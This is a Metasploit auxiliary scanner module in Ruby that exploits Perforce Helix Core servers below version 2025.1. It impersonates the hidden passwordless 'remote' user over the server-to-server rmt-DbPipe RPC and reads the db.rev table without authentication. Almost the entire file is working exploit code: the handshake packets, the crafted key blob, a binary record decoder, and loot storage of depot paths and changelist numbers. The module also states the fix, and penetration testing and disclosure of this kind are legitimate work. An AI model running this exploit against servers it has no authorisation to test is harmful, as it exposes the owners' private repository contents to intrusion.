# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/perforce'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Perforce

  # keyVal binary blob sent with the rmt-DbPipe command (42 bytes):
  #   [0-3]  LE uint32 2       — table scan start key type
  #   [4-5]  "//"              — depot path prefix
  #   [6-9]  LE uint32 INT_MAX — upper bound (0x7fffffff)
  #   [10-41] zeroes           — padding
  #
  # Reference: https://morganrobertson.net/p4wned/
  KEY_VAL = ([2].pack('V') + '//' + [0x7fffffff].pack('V') + ("\x00" * 32)).b.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Perforce Helix Core Unauthenticated Remote Depot File Enumeration',
        'Description' => %q{
          Enumerates depot file paths and changelist numbers from Perforce
          (Helix Core) servers without authentication by exploiting the hidden
          "remote" user and the server-to-server rmt-DbPipe RPC.

          rmt-DbPipe is a server-to-server protocol command that reads directly
          from the db.rev database table. When invoked by the "remote" user it
          bypasses normal authentication entirely and returns the full depot
          revision history as a binary blob.

          The vulnerability exists because the "remote" user is a hidden
          built-in account with no password that is only intended to be
          accessible from other trusted p4d instances. In practice, any client
          that mimics the server-to-server protocol handshake can invoke it.

          Affected: Perforce server versions below 2025.1 with security < 4
          (default security level is 0).

          Remediation:
          Upgrade to 2025.1 or later, OR
          p4 configure set security=4
        },
        'Author' => ['Morgan Robertson'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://morganrobertson.net/p4wned/']
        ],
        'DisclosureDate' => '2025-04-13',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(1666),
      OptInt.new('TIMEOUT', [true, 'Connection and read timeout (seconds)', 15])
    ])
  end

  # ---------------------------------------------------------------------------
  # db.rev binary decoder
  # ---------------------------------------------------------------------------

  # Decode the binary payload returned in dmr-DbPipe response packets.
  #
  # Each record in the blob represents one file revision in the depot:
  #   length-prefixed string  depotFile
  #   LE uint32               rev
  #   LE uint32               type
  #   LE uint32               action
  #   LE uint32               change
  #   LE uint32               date  (Unix timestamp)
  #   LE uint32               modTime
  #   16 bytes                MD5 digest
  #   8 bytes                 file size
  #   4 bytes                 trait
  #   4 bytes                 (unknown)
  #   length-prefixed string  lazyFile  (may be empty)
  #   length-prefixed string  revStr    (may be empty)
  #   length-prefixed string  typeStr   (may be empty)
  #
  # @param data [String] raw binary payload from a dmr-DbPipe packet
  # @return [Array<Hash>] decoded records with :depot_file, :change, :date
  def decode_db_rev(data)
    data = data.b
    off = 0
    records = []

    read_uint32 = lambda do
      return nil if off + 4 > data.bytesize

      v = data[off, 4].unpack1('V')
      off += 4
      v
    end

    read_string = lambda do
      len = read_uint32.call
      return nil if len.nil? || off + len > data.bytesize

      s = data[off, len]
      off += len
      s.encode('UTF-8', 'binary', invalid: :replace, undef: :replace)
    end

    while off < data.bytesize
      depot_file = read_string.call
      break if depot_file.nil?

      read_uint32.call  # rev
      read_uint32.call  # type
      read_uint32.call  # action

      change = read_uint32.call
      date = read_uint32.call
      read_uint32.call  # modTime

      # Skip: MD5 digest (16) + file size (8) + trait (4) + unknown (4) = 32 bytes
      break if off + 32 > data.bytesize

      off += 32

      read_string.call  # lazyFile
      read_string.call  # revStr
      read_string.call  # typeStr

      next if change.nil? || date.nil?

      date_str = Time.at(date).utc.strftime('%Y-%m-%d')
      records << { depot_file: depot_file, change: change, date: date_str }
    end

    records
  end

  # ---------------------------------------------------------------------------
  # Query
  # ---------------------------------------------------------------------------

  # Send the rmt-DbPipe command using the server-to-server protocol handshake.
  # Returns a result hash:
  #   { packets: [], ssl_needed: bool, unicode_needed: bool, error: str|nil }
  def query_server(ip, port, use_ssl, use_unicode)
    timeout = datastore['TIMEOUT']

    # Server-to-server protocol handshake (differs from regular client handshake:
    # uses serverID + cmdIdent instead of cmpfile + api + client capabilities).
    p1 = p4_build_packet([
      ['serverID', ''],
      ['cmdIdent', '4139E823 20EDF233 3D743292 62DFA422'],
      ['client', '97'],
      ['sndbuf', '1969919'],
      ['rcvbuf', '98304'],
      ['autoTune', '1'],
      ['func', 'protocol']
    ])

    # rmt-DbPipe: direct db.rev table read via the hidden "remote" user.
    # keyVal is a binary scan-key struct; see KEY_VAL constant above.
    cmd_params = [
      ['keyVal', KEY_VAL],
      ['os', 'UNIX'],
      ['cwd', ''],
      ['client', ''],
      ['table', 'db.rev'],
      ['confirm', 'dmr-DbPipe'],
      ['version', '10'],
      ['remoteRange', '1'],
      ['remoteMap0', '//...'],
      ['user', 'remote']
    ]
    cmd_params << ['unicode', ''] if use_unicode
    cmd_params << ['func', 'rmt-DbPipe']

    payload = p1 + p4_build_packet(cmd_params)
    release = p4_build_packet([['func', 'release']])

    begin
      sock = p4_connect(ip, port, use_ssl, timeout)
    rescue Rex::ConnectionError, Rex::ConnectionTimeout => e
      return { packets: [], ssl_needed: false, unicode_needed: false, error: e.message }
    end

    begin
      sock.put(payload)
      raw = p4_recv_response(sock, timeout)
    rescue ::EOFError, ::Errno::ECONNRESET => e
      begin
        sock.close
      rescue StandardError
        nil
      end
      return { packets: [], ssl_needed: false, unicode_needed: false, error: e.message }
    end

    if p4_tls_required?(raw, use_ssl)
      begin
        sock.close
      rescue StandardError
        nil
      end
      return { packets: [], ssl_needed: true, unicode_needed: false, error: nil }
    end

    begin
      sock.put(release)
    rescue StandardError
      nil
    end
    begin
      sock.close
    rescue StandardError
      nil
    end

    packets = p4_parse_response(raw)

    return { packets: [], ssl_needed: true, unicode_needed: false, error: nil } if p4_ssl_error_in_packets?(packets)
    return { packets: [], ssl_needed: false, unicode_needed: true, error: nil } if p4_unicode_error_in_packets?(packets)

    { packets: packets, ssl_needed: false, unicode_needed: false, error: nil }
  end

  # ---------------------------------------------------------------------------
  # Scanner entry point
  # ---------------------------------------------------------------------------

  def run_host(ip)
    port = datastore['RPORT']

    result = query_server(ip, port, false, false)
    use_ssl = false

    if result[:ssl_needed]
      result = query_server(ip, port, true, false)
      use_ssl = true
    end

    if result[:error] && result[:packets].empty?
      vprint_error("#{Rex::Socket.to_authority(ip, port)} - #{result[:error]}")
      return
    end

    result = query_server(ip, port, use_ssl, true) if result[:unicode_needed]

    # The server sends dmr-DbPipe packets containing the binary db.rev blob.
    # Each packet may represent a partial or complete slice of the table.
    files = []
    result[:packets].each do |pkt|
      next unless pkt['func']&.b == 'dmr-DbPipe'.b
      next unless pkt['data'] && !pkt['data'].empty?

      files.concat(decode_db_rev(pkt['data']))
    end

    if files.empty?
      vprint_status(
        "#{Rex::Socket.to_authority(ip, port)} - " \
        'No depot files returned (server may be patched or security>=4)'
      )
      return
    end

    proto = use_ssl ? 'ssl' : 'tcp'

    report_service(
      host: ip,
      port: port,
      proto: 'tcp',
      name: 'perforce',
      info: "Perforce Helix Core (#{proto})"
    )

    report_vuln(
      host: ip,
      port: port,
      name: 'Perforce Helix Core Unauthenticated Remote Depot Access (rmt-DbPipe)',
      info: "#{files.length} depot file revision(s) read via rmt-DbPipe without " \
            'authentication. Affects versions < 2025.1 with security < 4.',
      refs: references
    )

    loot_lines = files.map do |f|
      "[change=#{f[:change]}] [#{f[:date]}] #{f[:depot_file]}"
    end

    store_loot(
      'perforce.depot_files',
      'text/plain',
      ip,
      loot_lines.join("\n"),
      'perforce_depot_files.txt',
      'Perforce depot file paths and changelist numbers (rmt-DbPipe)'
    )

    print_good(
      "#{Rex::Socket.to_authority(ip, port)} [#{proto}] " \
      "#{files.length} depot file revision(s) retrieved via rmt-DbPipe:"
    )

    files.each do |f|
      print_status(
        "  [change=#{f[:change]}] [#{f[:date]}] #{f[:depot_file]}"
      )
    end
  end
end
